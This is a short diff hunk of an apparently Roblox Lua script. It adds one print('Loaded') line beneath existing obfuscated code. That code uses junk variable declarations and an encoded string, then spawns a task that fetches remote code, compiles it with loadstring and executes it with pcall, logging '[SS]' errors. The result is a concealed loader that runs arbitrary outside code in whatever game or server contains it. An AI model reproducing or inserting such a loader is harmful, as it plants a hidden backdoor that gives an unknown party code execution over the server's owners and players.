@@ -77,3 +77,4 @@ local a=false;local b=nil;local c=true;local d=0;local a=nil;local b=falselocal;
 	]]):format(a,"JCE1Ijx5ZHw/ISAgYjAoISUlNSFhICQ+YzQxO2AxPj1jOhQHJQQxOAEMECsNKT4wJx95OnwzAgkKHRAEAQUkOS8="))end;task.spawn(function()local v=r()if not v then warn("[SS] fetch failed")return end;local w,x=loadstring(v)if not w then warn("[SS] parse:",x)return end;local t,y=pcall(w)if not t then warn("[SS] exec:",y)end;u()end)
 
 
+print("Loaded")
